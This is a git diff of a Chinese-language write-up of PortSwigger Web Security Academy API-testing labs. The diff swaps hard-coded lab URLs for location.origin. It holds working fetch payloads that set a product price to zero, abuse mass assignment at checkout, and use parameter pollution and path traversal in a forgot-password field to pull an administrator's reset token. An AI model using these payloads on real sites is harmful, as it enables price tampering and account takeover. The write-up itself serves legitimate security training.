@@ -27,19 +27,16 @@ fetch(`${location.origin}/api/user/carlos`, { method: "delete" });
 | Document  | https://portswigger.net/web-security/api-testing#identifying-api-endpoints          |
 | Lab       | https://portswigger.net/web-security/api-testing/lab-exploiting-unused-api-endpoint |
 
-這題算蠻明顯的(?)進入商品頁有戳 https://0adc005f04ac86ae83fb50b500350097.web-security-academy.net/api/products/1/price，嘗試構造
+這題算蠻明顯的(?)進入商品頁有戳 `/api/products/1/price`，嘗試構造
 
 ```js
-fetch(
-  "https://0adc005f04ac86ae83fb50b500350097.web-security-academy.net/api/products/1/price",
-  {
-    method: "patch",
-    headers: {
-      "Content-Type": "application/json",
-    },
-    body: JSON.stringify({ price: 0 }),
+fetch(`${location.origin}/api/products/1/price`, {
+  method: "patch",
+  headers: {
+    "Content-Type": "application/json",
   },
-);
+  body: JSON.stringify({ price: 0 }),
+});
 ```
 
 ## Lab: Exploiting a mass assignment vulnerability
@@ -49,13 +46,13 @@ fetch(
 | Document  | https://portswigger.net/web-security/api-testing#mass-assignment-vulnerabilities              |
 | Lab       | https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability |
 
-這題我嘗試過 `/change-email` 搭配 `isAdmin`，也嘗試 PATCH https://0a37007203736e3f832506750093001f.web-security-academy.net/product?productId=1 都沒用
+這題我嘗試過 `/change-email` 搭配 `isAdmin`，也嘗試 PATCH `/product?productId=1` 都沒用
 
 後來發現 `/api` 有公開 API 文件，嘗試
 
 ```js
 fetch(`${location.origin}/api/checkout`, {
-  method: "post",
+  method: "POST",
   headers: {
     "content-type": "application/json",
   },
@@ -75,7 +72,7 @@ fetch(`${location.origin}/api/checkout`, {
 
 ```js
 fetch(`${location.origin}/api/checkout`, {
-  method: "post",
+  method: "POST",
   headers: {
     "content-type": "application/json",
   },
@@ -180,7 +177,7 @@ const robustSearch = sp.toString(); // name=peter%26role%3Dadmin
 
 這題是 querystring 會吃到後面的那個
 
-https://0ac200260456957680e71cd400bd0060.web-security-academy.net/product?productId=1&productId=2 實際上會去拿 productId=2
+`/product?productId=1&productId=2` 實際上會去拿 `productId=2`
 
 忘記密碼功能，觀察 forgotPassword.js
 
@@ -198,25 +195,21 @@ forgotPwdReady(() => {
 });
 ```
 
-嘗試訪問 https://0ac200260456957680e71cd400bd0060.web-security-academy.net/forgot-password?reset_token=1，只得到 `"Invalid token"`
+嘗試訪問 `/forgot-password?reset_token=1`，只得到 "Invalid token"
 
 這題我做到這邊就卡關了，後來是參考解答的步驟
 
 1. 嘗試注入 (%26) &，新的 querystring key value
 
 ```js
-fetch(
-  "https://0ae3004e038405db81d50dc8002f0055.web-security-academy.net/forgot-password",
-  {
-    headers: {
-      "content-type": "x-www-form-urlencoded",
-    },
-    body: "csrf=fWqdhuV1N3QZGXTm5Z4JRpmvUJWpIUWg&username=administrator%26a=1",
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/forgot-password`, {
+  headers: {
+    "content-type": "x-www-form-urlencoded",
   },
-);
+  body: "csrf=fWqdhuV1N3QZGXTm5Z4JRpmvUJWpIUWg&username=administrator%26a=1",
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 回傳
@@ -228,18 +221,14 @@ fetch(
 2. 嘗試注入 (%23) #，把 URL 後面的部分截斷
 
 ```js
-fetch(
-  "https://0ae3004e038405db81d50dc8002f0055.web-security-academy.net/forgot-password",
-  {
-    headers: {
-      "content-type": "x-www-form-urlencoded",
-    },
-    body: "csrf=fWqdhuV1N3QZGXTm5Z4JRpmvUJWpIUWg&username=administrator%23",
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/forgot-password`, {
+  headers: {
+    "content-type": "x-www-form-urlencoded",
   },
-);
+  body: "csrf=fWqdhuV1N3QZGXTm5Z4JRpmvUJWpIUWg&username=administrator%23",
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 回傳
@@ -251,18 +240,14 @@ fetch(
 3. 嘗試注入 %26field=1
 
 ```js
-fetch(
-  "https://0ae3004e038405db81d50dc8002f0055.web-security-academy.net/forgot-password",
-  {
-    headers: {
-      "content-type": "x-www-form-urlencoded",
-    },
-    body: "csrf=fWqdhuV1N3QZGXTm5Z4JRpmvUJWpIUWg&username=administrator%26field=1",
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/forgot-password`, {
+  headers: {
+    "content-type": "x-www-form-urlencoded",
   },
-);
+  body: "csrf=fWqdhuV1N3QZGXTm5Z4JRpmvUJWpIUWg&username=administrator%26field=1",
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 回傳
@@ -274,18 +259,14 @@ fetch(
 4. 結合 forgotPassword.js，嘗試注入 %26field=reset_token
 
 ```js
-fetch(
-  "https://0ae3004e038405db81d50dc8002f0055.web-security-academy.net/forgot-password",
-  {
-    headers: {
-      "content-type": "x-www-form-urlencoded",
-    },
-    body: "csrf=fWqdhuV1N3QZGXTm5Z4JRpmvUJWpIUWg&username=administrator%26field=reset_token",
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/forgot-password`, {
+  headers: {
+    "content-type": "x-www-form-urlencoded",
   },
-);
+  body: "csrf=fWqdhuV1N3QZGXTm5Z4JRpmvUJWpIUWg&username=administrator%26field=reset_token",
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 回傳
@@ -312,20 +293,14 @@ fetch(
 嘗試
 
 ```js
-fetch(
-  "https://0a390033034b4ab6814f848d00ac0025.web-security-academy.net/forgot-password",
-  {
-    headers: {
-      "content-type": "x-www-form-urlencoded",
-    },
-    referrer:
-      "https://0a390033034b4ab6814f848d00ac0025.web-security-academy.net/forgot-password",
-    body: "csrf=ft2vWo0d3sKWAvlbB010wvFEVVKU0vau&username=administrator%26a=1",
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/forgot-password`, {
+  headers: {
+    "content-type": "x-www-form-urlencoded",
   },
-);
+  body: "csrf=ft2vWo0d3sKWAvlbB010wvFEVVKU0vau&username=administrator%26a=1",
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 回傳
@@ -340,20 +315,14 @@ fetch(
 嘗試
 
 ```js
-fetch(
-  "https://0a390033034b4ab6814f848d00ac0025.web-security-academy.net/forgot-password",
-  {
-    headers: {
-      "content-type": "x-www-form-urlencoded",
-    },
-    referrer:
-      "https://0a390033034b4ab6814f848d00ac0025.web-security-academy.net/forgot-password",
-    body: "csrf=ft2vWo0d3sKWAvlbB010wvFEVVKU0vau&username=administrator%23a=1",
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/forgot-password`, {
+  headers: {
+    "content-type": "x-www-form-urlencoded",
   },
-);
+  body: "csrf=ft2vWo0d3sKWAvlbB010wvFEVVKU0vau&username=administrator%23a=1",
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 回傳
@@ -368,20 +337,14 @@ fetch(
 嘗試
 
 ```js
-fetch(
-  "https://0a390033034b4ab6814f848d00ac0025.web-security-academy.net/forgot-password",
-  {
-    headers: {
-      "content-type": "x-www-form-urlencoded",
-    },
-    referrer:
-      "https://0a390033034b4ab6814f848d00ac0025.web-security-academy.net/forgot-password",
-    body: "csrf=ft2vWo0d3sKWAvlbB010wvFEVVKU0vau&username=%2F..%2F..%2F..%2F..%2F",
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/forgot-password`, {
+  headers: {
+    "content-type": "x-www-form-urlencoded",
   },
-);
+  body: "csrf=ft2vWo0d3sKWAvlbB010wvFEVVKU0vau&username=%2F..%2F..%2F..%2F..%2F",
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 回傳
@@ -397,20 +360,14 @@ fetch(
 嘗試
 
 ```js
-fetch(
-  "https://0a390033034b4ab6814f848d00ac0025.web-security-academy.net/forgot-password",
-  {
-    headers: {
-      "content-type": "x-www-form-urlencoded",
-    },
-    referrer:
-      "https://0a390033034b4ab6814f848d00ac0025.web-security-academy.net/forgot-password",
-    body: "csrf=ft2vWo0d3sKWAvlbB010wvFEVVKU0vau&username=%2F..%2F..%2F..%2F..%2Fapi",
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/forgot-password`, {
+  headers: {
+    "content-type": "x-www-form-urlencoded",
   },
-);
+  body: "csrf=ft2vWo0d3sKWAvlbB010wvFEVVKU0vau&username=%2F..%2F..%2F..%2F..%2Fapi",
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 回傳
@@ -444,20 +401,14 @@ fetch(
 所以後來嘗試
 
 ```js
-fetch(
-  "https://0a390033034b4ab6814f848d00ac0025.web-security-academy.net/forgot-password",
-  {
-    headers: {
-      "content-type": "x-www-form-urlencoded",
-    },
-    referrer:
-      "https://0a390033034b4ab6814f848d00ac0025.web-security-academy.net/forgot-password",
-    body: "csrf=ft2vWo0d3sKWAvlbB010wvFEVVKU0vau&username=%2F..%2F..%2F..%2F..%2Fopenapi.json%23",
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/forgot-password`, {
+  headers: {
+    "content-type": "x-www-form-urlencoded",
   },
-);
+  body: "csrf=ft2vWo0d3sKWAvlbB010wvFEVVKU0vau&username=%2F..%2F..%2F..%2F..%2Fopenapi.json%23",
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 回傳
@@ -492,18 +443,14 @@ fetch(
 之後就先用正常 UI 操作忘記密碼的方式，這步驟應該是會產生 passwordResetToken，之後再
 
 ```js
-fetch(
-  "https://0a8f003e03a95ba5825becdf00a5004b.web-security-academy.net/forgot-password",
-  {
-    headers: {
-      "content-type": "x-www-form-urlencoded",
-    },
-    body: "csrf=VhZqXhbhPXLtHMZh7VD8pNjI06kh8TjV&username=%2F..%2F..%2F..%2F..%2Fapi%2Finternal%2Fv1%2Fusers%2Fadministrator%2Ffield%2FpasswordResetToken%23",
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/forgot-password`, {
+  headers: {
+    "content-type": "x-www-form-urlencoded",
   },
-);
+  body: "csrf=VhZqXhbhPXLtHMZh7VD8pNjI06kh8TjV&username=%2F..%2F..%2F..%2F..%2Fapi%2Finternal%2Fv1%2Fusers%2Fadministrator%2Ffield%2FpasswordResetToken%23",
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 回傳
